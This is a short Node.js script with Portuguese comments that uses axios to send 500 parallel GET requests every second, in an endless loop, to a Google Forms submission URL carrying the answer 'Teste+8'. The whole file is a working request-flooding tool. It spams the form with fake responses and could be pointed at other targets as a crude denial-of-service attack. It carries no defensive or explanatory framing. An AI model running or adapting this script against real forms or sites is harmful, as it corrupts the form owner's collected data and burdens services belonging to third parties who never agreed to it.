const axios = require('axios');

// URL alvo para as requisições
const url_alvo = 'https://docs.google.com/forms/d/e/1FAIpQLSdl817lHR0nZefPEtdaDIbvuEhsHKheMv1FvSgGjV7FDdG24A/formResponse?entry.1895690451=Teste+8';

// Número de requisições por loop
const numRequisicoes = 500;

// Função para enviar uma requisição
async function enviarRequisicao() {
    try {
        const response = await axios.get(url_alvo);
        console.log(`Status da requisição: ${response.status}`);
    } catch (error) {
        console.error(`Erro na requisição: ${error.message}`);
    }
}

// Envia múltiplas requisições em paralelo
async function enviarRequisicoesParalelas() {
    const requests = Array.from({ length: numRequisicoes }, () => enviarRequisicao());
    await Promise.all(requests);
}

// Loop
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  async function execucaoAssincrona() {
    while (true) {
      // Envio das requisições
      enviarRequisicoesParalelas();
  
      // Delay do loop (em ms)
      await delay(1000);
    }
  }
  
  execucaoAssincrona(); // Inicia o loop com delay
  